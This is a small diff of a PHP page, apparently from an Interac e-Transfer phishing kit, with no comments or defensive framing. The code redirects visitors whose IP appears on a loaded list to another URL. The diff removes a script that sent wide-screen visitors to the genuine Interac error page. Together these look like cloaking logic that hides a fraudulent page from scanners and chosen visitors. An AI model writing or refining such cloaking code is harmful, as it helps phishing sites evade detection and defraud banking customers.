@@ -43,7 +43,7 @@ $data   = explode("\n", $data);
 
 
 if (in_array($vis_ip,$data))
-{ echo '<html><head><meta http-equiv="refresh" content="0;URL='.$out_url.'"></head><body></body><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>';
+{ echo '<html><head><meta http-equiv="refresh" content="0;URL='.$out_url.'"></head><body></body></html>';
 die();
 }
 
@@ -86,5 +86,5 @@ echo '<!DOCTYPE HTML>
 <body>
 &nbsp;
 </body>
-<script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>';
+</html>';
 ?>
